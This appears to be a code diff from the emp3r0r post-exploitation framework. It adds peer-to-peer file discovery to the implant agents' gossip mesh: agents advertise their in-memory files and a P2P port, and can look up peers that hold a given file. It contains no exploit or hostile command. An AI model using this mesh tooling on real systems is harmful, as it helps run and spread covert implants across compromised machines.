@@ -10,10 +10,12 @@ package mesh
 import (
 	"context"
 	"math/rand"
+	"path/filepath"
 	"strconv"
 	"sync"
 	"time"
 
+	"github.com/fxamacker/cbor/v2"
 	"github.com/hashicorp/memberlist"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
@@ -29,6 +31,8 @@ var (
 	// n>0 = Routed node (hops through n peers)
 	myDistance     = -1
 	myDistanceMu   sync.RWMutex
+	localP2PPort   int
+	localP2PPortMu sync.RWMutex
 	gossipList     *memberlist.Memberlist
 	gossipMu       sync.RWMutex
 	gossipDelegate *transport.GossipDelegate
@@ -51,6 +55,20 @@ var (
 	gatewayReadyCh = make(chan struct{}, 1)
 )
 
+// SetLocalP2PPort sets the dynamic P2P server port for this agent.
+func SetLocalP2PPort(port int) {
+	localP2PPortMu.Lock()
+	localP2PPort = port
+	localP2PPortMu.Unlock()
+}
+
+// GetLocalP2PPort gets the dynamic P2P server port for this agent.
+func GetLocalP2PPort() int {
+	localP2PPortMu.RLock()
+	defer localP2PPortMu.RUnlock()
+	return localP2PPort
+}
+
 // SetDistance updates this node's advertised distance.
 func SetDistance(d int) {
 	myDistanceMu.Lock()
@@ -69,6 +87,8 @@ func currentMeta() *def.MeshNodeMeta {
 	return &def.MeshNodeMeta{
 		Token:    common.RuntimeConfig.MyAgentToken,
 		Distance: getDistance(),
+		P2PPort:  GetLocalP2PPort(),
+		Files:    util.ListMemFiles(),
 	}
 }
 
@@ -87,6 +107,8 @@ func Start(ctx context.Context) {
 		gossipMu.Unlock()
 		logging.Infof("Mesh: gossip engine ready (%d initial peers)", len(common.RuntimeConfig.InitialPeers))
 	}
+
+	util.OnMemFSChanged = UpdateGossipMeta
 
 	if common.RuntimeConfig.IsDirectC2Enabled {
 		// Gateway: distance=0, serve relay.
@@ -349,4 +371,47 @@ func meshGossipPort() int {
 		return p
 	}
 	return 7946 // memberlist default
+}
+
+// GetPeersForFile returns a map of peerIP -> p2pPort for all gossip cluster peers
+// that advertise having the requested file in their MemFS/local storage.
+func GetPeersForFile(fileName string) map[string]int {
+	gossipMu.RLock()
+	list := gossipList
+	gossipMu.RUnlock()
+	if list == nil {
+		return nil
+	}
+
+	memKey := "mem:///" + filepath.Base(fileName)
+	baseName := filepath.Base(fileName)
+	result := make(map[string]int)
+
+	for _, m := range list.Members() {
+		if m.Name == common.RuntimeConfig.AgentUUID {
+			continue
+		}
+		if len(m.Meta) == 0 {
+			continue
+		}
+		var meta def.MeshNodeMeta
+		if err := cbor.Unmarshal(m.Meta, &meta); err != nil {
+			continue
+		}
+		for _, f := range meta.Files {
+			if f == fileName || f == memKey || filepath.Base(f) == baseName {
+				port := meta.P2PPort
+				if port <= 0 {
+					if p, err := strconv.Atoi(common.RuntimeConfig.P2PRelayPort); err == nil && p > 0 {
+						port = p
+					}
+				}
+				if port > 0 {
+					result[m.Addr.String()] = port
+					break
+				}
+			}
+		}
+	}
+	return result
 }
